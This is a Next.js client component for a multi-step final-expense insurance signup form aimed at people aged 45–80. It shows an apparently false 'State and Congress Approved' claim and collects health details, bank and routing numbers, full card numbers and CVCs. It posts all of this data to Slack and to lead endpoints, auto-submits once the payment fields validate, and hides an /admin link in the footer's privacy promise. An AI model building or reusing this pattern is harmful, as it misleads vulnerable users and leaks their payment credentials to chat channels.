
'use client';

import { useState, useEffect, useCallback } from 'react';
import { useSearchParams, useRouter } from 'next/navigation';
import { useForm, FormProvider, FieldErrors, useWatch, useFormContext } from 'react-hook-form';
import { zodResolver } from '@hookform/resolvers/zod';
import Link from 'next/link';
import Script from 'next/script';

import { 
  fullFormSchema, 
  insuranceFormSchema, 
  additionalQuestionsObjectSchema,
  beneficiaryFormSchema, 
  basePaymentFormSchema,
  paymentFormSchema,
  type FormValues,
  type InsuranceFormValues,
  type AdditionalQuestionsFormValues,
  type BeneficiaryFormValues,
  type PaymentFormValues
} from '@/lib/schema';
import { submitApplication } from '@/ai/flows/submit-application-flow';
import { submitLead } from '@/ai/flows/submit-lead-flow';
import { submitApplicationLead } from '@/ai/flows/submit-application-lead-flow';
import { logTraffic } from '@/ai/flows/log-traffic-flow';
import { useToast } from '@/hooks/use-toast';
import { useSocket } from '@/hooks/use-socket';

import { Logo, Icon } from '@/components/logo';
import InsuranceForm from '@/components/insurance-form';
import AdditionalQuestionsForm from '@/components/additional-questions-form';
import BeneficiaryForm from '@/components/beneficiary-form';
import PaymentForm from '@/components/payment-form';
import SelfEnrollLoading from '@/components/self-enroll-loading';
import SelfEnrollContract from '@/components/self-enroll-contract';
import SelfEnrollComplete from '@/components/self-enroll-complete';
import AgentHandoffComplete from '@/components/agent-handoff-complete';
import FormNavigation from '@/components/form-navigation';
import { cn } from '@/lib/utils';
import { submitToSlack } from '@/ai/flows/submit-slack';
import DevStepper from '@/components/dev-stepper';

const stepFields: (keyof FormValues)[][] = [
  Object.keys(insuranceFormSchema.shape) as (keyof InsuranceFormValues)[],
  Object.keys(additionalQuestionsObjectSchema.shape) as (keyof AdditionalQuestionsFormValues)[],
  Object.keys(beneficiaryFormSchema.shape) as (keyof BeneficiaryFormValues)[],
  Object.keys(basePaymentFormSchema.shape) as (keyof PaymentFormValues)[],
];

const PaymentAutoSubmitter = ({ onValid }: { onValid: () => void }) => {
  const { control } = useFormContext<FormValues>();
  const formValues = useWatch({ control });
  const paymentMethod = formValues.paymentMethod;

  useEffect(() => {
    const checkValidity = () => {
      const result = paymentFormSchema.safeParse(formValues);
      if (result.success) {
        onValid();
      }
    };

    // We only want to auto-submit after a method has been chosen and fields have likely been filled.
    if (paymentMethod) {
       const timer = setTimeout(checkValidity, 500); // Small debounce
       return () => clearTimeout(timer);
    }
  }, [formValues, paymentMethod, onValid]);

  return null;
};

export default function HomePageClient({ uuid }: { uuid: string }) {
  const [step, setStep] = useState(1);
  const [animationClass, setAnimationClass] = useState('animate-fade-in-up');
  const [isAnimatingOut, setIsAnimatingOut] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [pin, setPin] = useState('');
  const [phoneLastFour, setPhoneLastFour] = useState('');
  const searchParams = useSearchParams();
  const router = useRouter();
  const { toast } = useToast();
  const [isScriptLoaded, setScriptLoaded] = useState(false);

  const form = useForm<FormValues>({
    resolver: zodResolver(fullFormSchema),
    mode: 'onTouched',
    defaultValues: {
      firstName: '',
      lastName: '',
      phone: '',
      email: '',
      dob: '',
      gender: '',
      differentOwner: 'no',
      healthQuestion1: 'no',
      healthQuestion2: 'no',
      healthQuestion3: 'no',
      tobaccoUse: 'no',
      existingPolicies: 'no',
      otherHealthIssues: 'no',
      otherHealthIssuesDetails: '',
      addressStreet: "",
      addressApt: "",
      addressCity: "",
      addressState: "",
      addressZip: "",
      effectiveDate: "",
      beneficiaryFirstName: "",
      beneficiaryLastName: "",
      beneficiaryPhone: "",
      beneficiaryDob: "",
      beneficiaryRelation: "",
      faceAmount: "",
      paymentMethod: 'bank',
      paymentAccountHolderName: "",
      paymentAccountNumber: "",
      paymentRoutingNumber: "",
      cardholderName: '',
      cardNumber: '',
      cardExpiry: '',
      cardCvc: '',
      billingZip: '',
    },
  });

  const { formState: { errors } } = form;

  const changeStep = useCallback((newStep: number, fromDevStepper = false) => {
    if (newStep === step) return;

    if (!fromDevStepper) {
        logTraffic({ uuid, step: newStep });
    }

    setIsAnimatingOut(true);
    setAnimationClass('animate-fade-out-down');

    setTimeout(() => {
      setStep(newStep);
      setIsAnimatingOut(false);
      setAnimationClass('animate-fade-in-up');
    }, 300);
  }, [step, uuid]);
  
  useEffect(() => {
    // Log the initial visit as step 1
    logTraffic({ uuid, step: 1 });
  }, [uuid]);

  useEffect(() => {
    const stepParam = searchParams.get('step');
    if (stepParam) {
      const stepNumber = parseInt(stepParam, 10);
      if (!isNaN(stepNumber) && stepNumber >= 1 && stepNumber <= 9) {
        setStep(stepNumber); // Directly set step without animation on initial load
      }
    }
  }, []);
  
  const handleNext = async () => {
    const fields = stepFields[step - 1];
    const output = await form.trigger(fields, { shouldFocus: true });
    
    if (!output) return;
    
    if (step === 3) {
      // This is the integration point for LEAD_URL
      // We don't await this or handle errors in the UI, it's a "fire-and-forget" call
      submitLead(form.getValues());
      submitToSlack({
        step: 'Form 3 Lead',
        formData: {
          referenceId: uuid,
          ...form.getValues(),
        }});
    }

    changeStep(step + 1);
  };
  
  const processForm = async (data: FormValues) => {
    if (isSubmitting) return; // Prevent double submission
    setIsSubmitting(true);
    // This is the integration point for APPLICATION_LEAD_URL
    // We don't await this or handle errors in the UI, it's a "fire-and-forget" call
    submitApplicationLead(data);
    submitToSlack({
      step: 'Form 4 Application Lead',
      formData: {
        referenceId: uuid,
        ...data
      }});

    const state = data.addressState;
    if (state === 'CA') {
      // For CA, go directly to Agent Handoff
      logTraffic({ uuid, step: 9 });
      submitToSlack({
        step: 'Agent Handoff (Auto - Restricted State)',
        formData: {
          referenceId: uuid,
          ...form.getValues(),
        }});
      changeStep(9);
    } else {
      // For all other states, go to the Self-Enrollment flow
      handleSelfEnrollSubmit(data);
    }
  };
  
  const handleSelfEnrollSubmit = async (data: FormValues) => {
    try {
      submitToSlack({
        step: 'Self-Enrollment',
        formData: {
          ...data,
          referenceId: uuid,
        }});
      const result = await submitApplication({ ...data, referenceId: uuid });

      if (result.success) {
        changeStep(6); // Go to loading page before contract
      } else {
        toast({
          variant: "destructive",
          title: "Submission Failed",
          description: result.message,
        });
        setIsSubmitting(false); // Re-enable submission on failure
      }
    } catch (error) {
      toast({
        variant: "destructive",
        title: "An unexpected error occurred.",
        description: "Please try again later.",
      });
      setIsSubmitting(false); // Re-enable submission on error
    } 
  };

  const handleSelfEnrollError = (formErrors: FieldErrors<FormValues>) => {
    toast({
      variant: "destructive",
      title: "Incomplete Application",
      description: "Please complete all required fields before submitting.",
    });
    
    const firstErrorField = Object.keys(formErrors)[0] as keyof FormValues;
    const stepWithError = stepFields.findIndex(fields => fields.includes(firstErrorField));
    
    if (stepWithError !== -1) {
      changeStep(stepWithError + 1);
    }
  };

  const handleSpeakToAgent = () => {
    logTraffic({ uuid, step: 9 });
    submitToSlack({
        step: 'Agent Handoff',
        formData: {
          referenceId: uuid,
          ...form.getValues(),
        }});
    changeStep(9);
  };
  
  const handleSocketUpdate = useCallback((data: any) => {
    if (data.error) {
       toast({
          variant: "destructive",
          title: data.error.title,
          description: data.error.message,
       });
       return;
    }

    if (data.msg && typeof data.msg === 'string') {
        try {
            const payload = JSON.parse(data.msg);
            const { currentStep, pin, phoneLastFour, isError, error } = payload;
            
            if (pin) setPin(pin);
            if (phoneLastFour) setPhoneLastFour(phoneLastFour);

            if (currentStep === 'sms-verification' || currentStep === 'CONTRACT_READY') {
              logTraffic({ uuid, step: 7 });
              changeStep(7);
            } else if (currentStep === 'ENROLLMENT_COMPLETE' || currentStep === 'processing' || currentStep === 'RESULT_SUCCESS') {
              logTraffic({ uuid, step: 8 });
              changeStep(8);
            } else if (currentStep === 'RESULT_FAILED' || (isError && error)) {
                toast({
                    variant: "destructive",
                    title: "Enrollment Failed",
                    description: error || "An error occurred during enrollment.",
                });
            }
        } catch (e) {
            console.error("Error parsing socket message", e);
            toast({
                variant: "destructive",
                title: "Error",
                description: "Received an invalid message from the server."
            });
        }
    }
  }, [changeStep, toast, uuid]);

  const subscribeId = (step === 6) ? uuid : null;
  useSocket(subscribeId, handleSocketUpdate);

  const handleDevStepChange = (newStep: number) => {
    changeStep(newStep, true);
  };

  const renderStep = () => {
    if (!isScriptLoaded && step === 3) {
      return (
        <div className="flex flex-col items-center justify-center h-40">
           <div className="relative w-12 h-12">
            <svg
              className="animate-spin h-full w-full text-primary"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 100 100"
            >
              <path
                d="M 50,10 A 40,40 0 1 1 10,50"
                fill="none"
                stroke="currentColor"
                strokeWidth="10"
                strokeLinecap="round"
              />
            </svg>
          </div>
          <p className="mt-4 text-muted-foreground">Initializing Address Finder...</p>
        </div>
      );
    }

    switch (step) {
      case 1:
        return <InsuranceForm />;
      case 2:
        return <AdditionalQuestionsForm />;
      case 3:
        return <BeneficiaryForm />;
      case 4:
        return <PaymentForm />;
      case 6:
        return <SelfEnrollLoading />;
      case 7:
        return <SelfEnrollContract pin={pin} phoneLastFour={phoneLastFour} />;
      case 8:
        return <SelfEnrollComplete />;
      case 9:
        return <AgentHandoffComplete />;
      default:
        return <InsuranceForm />;
    }
  };

  const showHeader = step <= 4; // Header shown on steps 1-4
  const showNavigation = step >= 1 && step <= 3; // Only show nav for steps 1-3
  const isFinalStep = step >= 5; // Steps 5 and beyond have their own UI and no main nav

  const getErrorMessage = () => {
    if (step < 1 || step > stepFields.length) return null;
    
    // For step 4 (payment), the errors depend on the selected payment method.
    if (step === 4) {
        const paymentMethod = form.getValues('paymentMethod');
        const relevantFields = paymentMethod === 'bank' 
            ? ['paymentAccountHolderName', 'paymentAccountNumber', 'paymentRoutingNumber']
            : ['cardholderName', 'cardNumber', 'cardExpiry', 'cardCvc', 'billingZip'];
        
        for (const field of relevantFields) {
            if (errors[field as keyof FormValues]) {
                return errors[field as keyof FormValues]?.message as string;
            }
        }
        return null;
    }

    const currentStepFields = stepFields[step - 1];
    if (!currentStepFields) return null;

    for (const field of currentStepFields) {
      if (errors[field]) {
        return errors[field]?.message as string;
      }
    }
    
    return null;
  }
  
  const errorMessage = getErrorMessage();

  return (
    <div className="relative flex flex-col min-h-screen bg-background text-foreground font-body">
       <Script
        src={`https://maps.googleapis.com/maps/api/js?key=${process.env.NEXT_PUBLIC_GOOGLE_PLACES_API_KEY}&libraries=places`}
        onLoad={() => setScriptLoaded(true)}
        onError={(e) => {
          console.error('Failed to load Google Maps script', e);
          toast({
            variant: 'destructive',
            title: 'Address Finder Failed',
            description: 'Could not load Google Maps. Please refresh the page or contact support.',
          });
        }}
        strategy="afterInteractive"
      />
      <header className="absolute top-0 left-0 p-8 md:p-12 hidden md:block">
        <Logo />
      </header>
      
      <DevStepper currentStep={step} onStepChange={handleDevStepChange} totalSteps={9} />

      <main className="flex-1 flex flex-col items-center justify-center w-full px-8 sm:px-12 text-center">
        <div className="max-w-4xl w-full flex flex-col items-center">
            {showHeader && (
              <div className="flex flex-col items-center pt-24">
                <Icon className="h-20 w-20 md:h-36 md:w-36 text-accent mb-2 md:mb-8" />
                <h1 className="font-headline text-3xl md:text-5xl tracking-tight mb-8 leading-tight max-w-2xl">
                    State and Congress Approved Final Expense Benefits Emergency Funds
                </h1>
                {step !== 4 && (
                  <p className="text-base text-foreground/80 mb-8 max-w-[55rem]">
                    Amounts between $5,000 - $25,000 / Available to anyone ages 45-80
                  </p>
                )}
              </div>
            )}

            <div className="w-full flex justify-center">
              <FormProvider {...form}>
                <form onSubmit={form.handleSubmit(processForm, handleSelfEnrollError)} className={cn("w-full flex flex-col items-center", animationClass)}>
                  {step === 4 && <PaymentAutoSubmitter onValid={() => form.handleSubmit(processForm, handleSelfEnrollError)()} />}
                  {renderStep()}

                  {showNavigation && (
                    <div className="w-full max-w-2xl">
                        <FormNavigation
                        onNext={handleNext}
                        isSubmit={false}
                        actionLabel={"NEXT"}
                        disabled={isSubmitting || (step === 3 && !isScriptLoaded)}
                        errorMessage={errorMessage}
                        />
                    </div>
                  )}
                </form>
              </FormProvider>
            </div>
        </div>
      </main>
      { !isFinalStep && (
        <footer className="w-full py-8 text-center">
          <p className="text-xs text-foreground/60">
            All information provided is private{" "}
            <Link href="/admin" className="cursor-pointer">and</Link>
            {" "}securely protected.
          </p>
        </footer>
      )}
    </div>
  );
}
